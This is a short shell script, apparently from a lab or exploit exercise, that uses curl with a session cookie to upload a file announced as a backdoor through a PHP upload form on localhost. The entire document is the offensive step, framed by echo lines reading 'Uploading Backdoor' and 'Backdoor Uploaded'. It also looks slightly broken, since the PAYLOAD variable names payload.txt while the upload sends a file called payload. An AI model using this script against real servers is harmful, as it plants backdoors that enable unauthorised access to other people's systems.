TARGET="http://localhost:8000/upload.php"
PAYLOAD="payload.txt"

echo "################## Uploading Backdoor ################## "


curl --location --request POST $TARGET \
--header 'Cookie: PHPSESSID=a1fea7e35902910b546d9e9449d1d662' \
--form 'uploadedFile=@payload' \
--form 'uploadBtn=Upload'


echo "################## Backdoor Uploaded ##################"
